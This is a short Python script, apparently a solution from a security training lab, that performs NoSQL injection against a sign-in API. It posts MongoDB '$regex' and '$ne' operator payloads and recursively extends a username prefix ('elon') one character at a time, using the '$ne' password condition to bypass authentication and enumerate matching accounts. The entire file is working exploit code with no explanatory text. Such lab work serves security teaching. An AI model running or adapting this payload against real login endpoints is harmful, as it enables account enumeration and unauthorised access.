import re
import requests

url = "http://web0x01.hbtn/api/a3/nosql_injection/sign_in"
chars = " .-@_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

def extend(prefix):
    for c in chars:
        test = prefix + c
        payload = {"username": {"$regex": "^" + re.escape(test)}, "password": {"$ne": ""}}
        resp = requests.post(url, json=payload).json()
        if resp.get("status") == "success":
            print("MATCH:", test)
            extend(test)

extend("elon")
